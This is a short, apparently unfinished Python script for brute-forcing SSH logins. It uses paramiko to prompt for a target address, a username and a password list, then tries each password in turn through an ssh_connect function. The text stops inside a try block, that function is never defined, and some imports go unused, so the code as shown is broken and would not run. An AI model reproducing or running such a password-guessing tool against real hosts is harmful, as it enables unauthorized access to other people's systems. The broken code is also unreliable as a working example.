import paramiko
import sys
import os
import socket
import termcolor

host = input('[+] Target address: ')
username = input('[+] SSH username: ')
input_file = input('[+] Passwords file: ')

if os.path.exists(input_file) == False:
    print('[!!] That file/path doesn\'t exist')
    sys.exit(1)

with open(input_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        try:
            ssh_connect(password)
